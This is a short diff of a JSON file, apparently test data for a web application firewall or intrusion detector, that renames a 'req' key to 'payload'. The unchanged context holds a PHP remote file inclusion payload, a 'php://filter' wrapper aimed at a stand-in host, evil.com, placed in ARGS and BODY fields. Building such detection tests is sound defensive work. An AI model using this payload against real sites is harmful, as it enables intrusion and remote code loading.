@@ -1,5 +1,5 @@
 {
-    "req": [
+    "payload": [
       {
         "ARGS": "page=php://filter/read=string.rot13/resource=http://evil.com/index.php",
         "BODY": "page=php://filter/read=string.rot13/resource=http://evil.com/index.php",
